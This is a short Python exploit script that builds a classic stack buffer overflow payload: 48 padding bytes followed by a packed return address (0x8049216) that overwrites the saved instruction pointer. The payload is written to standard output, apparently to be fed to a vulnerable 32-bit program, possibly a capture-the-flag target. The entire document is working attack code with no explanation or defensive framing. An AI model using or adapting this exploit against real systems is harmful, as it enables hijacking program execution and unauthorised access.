import struct
import sys

buffer = b'A' * 48
eip = struct.pack('<L', 0x8049216)

payload = buffer + eip

sys.stdout.buffer.write(payload)
